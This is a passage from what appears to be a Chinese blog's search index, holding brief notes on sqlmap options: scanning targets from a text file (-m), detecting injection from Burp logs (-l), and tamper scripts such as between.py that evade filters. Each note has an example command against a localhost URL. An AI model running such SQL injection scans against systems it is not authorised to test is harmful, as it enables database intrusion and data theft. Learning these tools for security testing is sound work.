扫描文本里的地址"></a>-m 扫描文本里的地址</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” -m “绝对路径”</p><h4 id="l-通过burp的日志文件检测注入"><a href="#l-通过burp的日志文件检测注入" class="headerlink" title="-l 通过burp的日志文件检测注入"></a>-l 通过burp的日志文件检测注入</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” -l “文件路径”</p><h4 id="–tamper-””-Tamper脚本运用"><a href="#–tamper-””-Tamper脚本运用" class="headerlink" title="–tamper=”” Tamper脚本运用"></a>–tamper=”” Tamper脚本运用</h4><p>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –tamper=”between.py”</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLmap </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
